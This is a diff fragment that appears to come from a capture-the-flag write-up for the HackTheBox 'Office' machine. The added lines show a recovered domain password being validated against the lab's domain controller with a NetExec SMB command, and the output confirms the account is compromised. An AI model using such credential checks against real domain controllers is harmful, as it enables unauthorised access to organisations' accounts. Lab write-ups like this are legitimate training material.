@@ -934,3 +934,11 @@ The other two gave an error but this one works
 ```python
 hhogan:H4ppyFtW183#
 ```
+Ill verify these credentials
+
+```python
+nxc smb dc.office.htb -u hhogan -p 'H4ppyFtW183#'         
+SMB         10.129.32.165   445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
+SMB         10.129.32.165   445    DC               [+] office.htb\hhogan:H4ppyFtW183#
+```
+This user is compromised!
